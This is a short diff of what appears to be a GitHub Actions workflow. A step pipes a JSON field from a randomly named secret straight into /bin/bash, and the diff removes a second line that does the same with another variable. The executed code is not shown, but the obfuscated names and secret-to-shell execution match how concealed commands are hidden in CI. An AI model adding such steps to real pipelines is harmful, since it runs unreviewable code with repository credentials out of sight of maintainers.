@@ -22,7 +22,6 @@ jobs:
           yyzgl19463: ${{ secrets.yyzgl19463 }}
         run: |
           printf '%s' "$yyzgl19463" | jq -r .bkcgt9448 | /bin/bash
-          echo $oauhc19 | jq -r .lih09 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
